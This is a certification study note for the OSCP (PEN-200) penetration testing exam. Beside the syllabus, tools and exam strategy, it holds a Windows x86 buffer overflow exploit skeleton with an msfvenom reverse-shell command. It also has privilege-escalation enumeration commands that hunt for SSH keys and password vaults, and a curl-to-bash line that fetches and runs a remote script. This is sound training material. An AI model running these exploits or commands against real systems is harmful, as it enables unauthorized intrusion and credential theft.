---
title: OSCP — Offensive Security Certified Professional (PEN-200)
tags:
  - advanced
  - cert
  - OSCP
  - PEN-200
  - OffSec
  - buffer-overflow
  - AD
  - exploitation
  - PWK
topic: Certification Study
difficulty: advanced
created: 2026-03-26
updated: 2026-03-26
source: OffSec official PEN-200 syllabus
---

# 💀 OSCP — Offensive Security Certified Professional

## Overview
The OSCP is the gold standard entry-to-mid-level penetration testing certification from Offensive Security (OffSec). It is entirely hands-on: a 23-hour 45-minute proctored exam where you must compromise machines and submit a professional penetration test report within 24 hours after.

**Exam format:**
- 3 standalone machines (10 pts each = 30 pts) + 1 Active Directory set (40 pts) = 70 pts possible
- Bonus points (10 pts max) from lab exercises
- **Passing score: 70 points**
- 23h 45m to hack, then 24h to write and submit report

**Cost:** ~$1,499 USD (includes 90 days lab access + exam attempt)

**Prerequisites:** Strong Linux/Windows fundamentals, basic networking, basic scripting. **eJPT or equivalent experience strongly recommended first.**

---

## PEN-200 Course Domains

### 1. Report Writing
- Professional pentest report structure
- Executive summary, technical findings, remediation recommendations
- Evidence documentation, screenshots, proof.txt contents

### 2. Information Gathering
- Passive recon (OSINT, Google dorks, Shodan, WHOIS)
- Active recon (Nmap, DNS enumeration, SMB enum)
- Web recon (Nikto, Gobuster, Wappalyzer, source review)

### 3. Vulnerability Scanning
- Nessus / OpenVAS basics
- Manual verification of scanner findings
- Reducing false positives

### 4. Web Application Attacks
- SQL injection (manual + SQLmap)
- XSS, file inclusion (LFI/RFI)
- File upload bypass
- Directory traversal
- Command injection
- Authentication bypass

### 5. Buffer Overflows (x86 Windows — still in PEN-200)
- Fuzzing with Python/Spike
- Finding offset with pattern_create / pattern_offset
- Controlling EIP
- Finding bad characters
- Finding JMP ESP in modules (no DEP/ASLR)
- Generating shellcode with msfvenom
- Shellcode alignment and padding

### 6. Client-Side Attacks
- Microsoft Office macro attacks
- HTML application (HTA) attacks
- Phishing and user interaction vectors

### 7. Locating Public Exploits
- Exploit-DB / searchsploit
- CVE research, PoC verification
- Exploit modification (NOP sleds, bad chars, payload swap)

### 8. Fixing and Modifying Exploits
- Updating exploit scripts for target environment
- Changing shellcode, fixing hardcoded values

### 9. Linux & Windows Privilege Escalation
- Manual enumeration first (before running scripts)
- GTFOBins (Linux), LOLBAS (Windows)
- LinPEAS, WinPEAS, PrivescCheck
- SUID/sudo/cron (Linux)
- Service misconfigs, unquoted paths, token impersonation (Windows)

### 10. Active Directory Attacks (Critical — 40 pts on exam)
- AD enumeration (BloodHound, PowerView, manual)
- Kerberoasting
- AS-REP roasting
- Pass-the-hash / pass-the-ticket
- DCSync (secretsdump)
- ACL abuse
- Lateral movement (CrackMapExec, Impacket, Evil-WinRM)
- Domain privilege escalation paths

### 11. Tunneling and Port Forwarding
- SSH local/remote/dynamic port forwarding
- Chisel, Ligolo-ng for reverse tunnels
- Proxychains with SOCKS5
- Metasploit autoroute + socks proxy

### 12. Metasploit Framework
- Limited to 1 use on exam (for non-AD standalone)
- Full use in labs
- msfvenom payload generation
- Multi/handler

---

## Buffer Overflow — Quick Skeleton (Windows x86)

```python
#!/usr/bin/env python3
import socket, sys, struct, subprocess

IP   = "TARGET_IP"
PORT = 9999

# PHASE 1: Fuzzing — find crash point
for size in range(100, 10000, 100):
    payload = b"A" * size
    try:
        s = socket.socket()
        s.connect((IP, PORT))
        s.send(b"OVERFLOW1 " + payload + b"\r\n")
        s.recv(1024)
        s.close()
    except:
        print(f"Crashed at ~{size} bytes")
        sys.exit()

# PHASE 2: Find exact offset
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2400
# Drop cyclic pattern as payload, note EIP value
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2400 -q EIP_VALUE
# Result: exact offset

offset = 1978   # Replace with actual offset
EIP    = b"BBBB"  # Will control RIP/EIP

# PHASE 3: Find bad characters
# Send all \x00-\xff after offset, observe in Immunity Debugger
bad_chars = b"\x00\x0a\x0d"  # At minimum; add found ones

# PHASE 4: Find JMP ESP
# mona.py: !mona jmp -r esp -cpb "\x00\x0a\x0d"
# Pick address with no ASLR/DEP (all protection bits 0)
jmp_esp = struct.pack("<I", 0x625011AF)  # Replace with actual address

# PHASE 5: Generate shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -b "\x00\x0a\x0d" -f py -v shellcode
shellcode = b""   # Paste msfvenom output here

# PHASE 6: Final exploit
padding = b"\x90" * 16  # NOP sled
payload = b"A" * offset + jmp_esp + padding + shellcode

s = socket.socket()
s.connect((IP, PORT))
s.send(b"OVERFLOW1 " + payload + b"\r\n")
s.close()
```

---

## Privilege Escalation Checklists

### Linux PrivEsc (Manual First)
```bash
# System info
uname -a; cat /etc/os-release; id; whoami; hostname

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo permissions
sudo -l

# Cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l

# Writable files in sensitive paths
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys

# Capabilities
getcap -r / 2>/dev/null

# Network services (internal)
netstat -tulnp; ss -tulnp

# Interesting files
find / -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "id_rsa" 2>/dev/null

# PATH injection
echo $PATH; ls -la /usr/local/bin/

# Run LinPEAS
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

### Windows PrivEsc (Manual First)
```powershell
# System info
whoami /priv; whoami /groups; systeminfo; hostname; ipconfig /all

# Running services
Get-Service | Where Status -eq Running
sc query type= all

# Unquoted service paths
wmic service get name,pathname | findstr /v /i "C:\Windows" | findstr /v /i """

# Weak service permissions
.\accesschk.exe -uwcqv "Everyone" *
.\accesschk.exe -uwcqv "Authenticated Users" *

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Interesting files
dir /s /b C:\*.txt C:\*.kdbx C:\*.config 2>nul | findstr /v recycle

# Run WinPEAS
.\winPEAS.exe
```

---

## Exam Strategy

```
Total time: 23h 45m
Target: 70+ points

Recommended order:
1. Start with AD set (40 pts — most valuable; do it fresh)
2. Then 3 standalone machines (10 pts each)
3. Take screenshots of EVERY step
4. Save proof.txt contents (type proof.txt on each)

Required proof files:
- local.txt  (unprivileged access = partial credit some cases)
- proof.txt  (full root/SYSTEM access)

Report requirements:
- Step-by-step for each machine
- Screenshots of exploitation
- Screenshots of proof.txt with hostname and IP visible
- Remediation section
```

---

## Essential Tools for OSCP

| Tool | Purpose |
|---|---|
| Nmap | Recon |
| Gobuster / ffuf | Web enumeration |
| Burp Suite | Web app testing |
| Metasploit (×1 non-AD) | Exploitation |
| searchsploit | Find public exploits |
| LinPEAS / WinPEAS | PrivEsc automation |
| BloodHound + SharpHound | AD mapping |
| Impacket suite | AD attacks |
| CrackMapExec / NetExec | AD lateral movement |
| Evil-WinRM | WinRM shell |
| Chisel / Ligolo-ng | Tunneling |
| msfvenom | Payload generation |
| Responder | Hash capture |

---

## Study Resources

| Resource | Notes |
|---|---|
| OffSec PEN-200 | Official course — required |
| HackTheBox Pro Labs (Offshore, RastaLabs) | AD practice |
| TJ Null's OSCP-like HTB list | https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/ |
| TCM Security courses | Practical Ethical Hacking, Linux/Windows PrivEsc |
| IppSec YouTube | HTB machine walkthroughs |
| HackTricks | https://book.hacktricks.xyz |

---

## Related Notes
- Penetration-Testing-Methodology
- Active-Directory
- AD-Attack-Reference
- Linux-Privilege-Escalation
- Windows-Privilege-Escalation
- BloodHound
- Impacket
- CrackMapExec
- eJPT-INE

## References
- OffSec OSCP: https://www.offsec.com/courses/pen-200/
- OSCP exam guide: https://help.offsec.com/hc/en-us/articles/360040165632

---
<- [[Certs-MOC]]